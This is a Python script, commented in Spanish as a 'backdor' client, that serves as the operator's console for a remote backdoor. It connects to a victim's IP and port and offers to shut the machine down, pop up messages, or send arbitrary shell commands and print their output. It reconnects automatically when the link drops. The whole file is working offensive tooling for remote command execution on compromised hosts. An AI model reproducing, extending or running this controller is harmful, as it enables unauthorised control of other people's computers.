import socket
import argparse
import time
import os
import platform
from colorama import init

init()

args=argparse.ArgumentParser()
args.add_argument('-P','--puerto',type=int)
args.add_argument('-IP','--ip',type=str)
arg = args.parse_args()


# cliente backdor

n = 0
timeout = 5

if platform.system() == 'Linux':
    borrar = 'clear'

elif platform.system() == 'Windows':
    borrar = 'cls'

def shell(socket):

    print('''
comandos basicos:
[1] apagar equipo
[2] enviar mensaje
[q] salir
[borrar] borrar script
          ''')
   
    entrada = str(input('[#] comando >> '))
    if entrada == 'q':
        print('\n\033[0;32m[*] saliendo\033[0m\n')
        exit(0)
    elif entrada == 'borrar':
        os.system(borrar)

    elif entrada == '1':

            socket.send(b'shutdown /s')

    elif entrada == '2':
        
        socket.send(f'msg * {str(input('mensaje> '))}'.encode())
        os.system(borrar)
    

    else:
        socket.send(entrada.encode())
        salida = socket.recv(1024).decode()
        if salida != None:
            print(salida)
        else:
            print('\n\033[0;31mno hubo respuesta\033[0m\n')
        return salida
    
def conexion(contador):

    print('\n\033[0;33m[*] iniciando...\033[0m\n')
    entrada = None
    salida = None
    while entrada != 'q':
        s= socket.socket()
        
        s.settimeout(timeout)
        try:
            
            if s.connect_ex((arg.ip,arg.puerto)) == 0:
                if contador == 0:
                    print(f'\n\033[0;32m[*] conectado a {arg.ip}:{arg.puerto}\033[0m\n')
                salida = shell(socket=s)
            else:
                print('\n\033[0;32mconexion perdida\033[0m\n')
                raise TimeoutError
        except (TimeoutError,ConnectionResetError):
            
            print('\n\033[0;33m[!] reconectando ...\033[0m\n')
        
            time.sleep(timeout)
            
            os.system(borrar)

            

        finally:
           contador= 1
            

conexion(contador=n)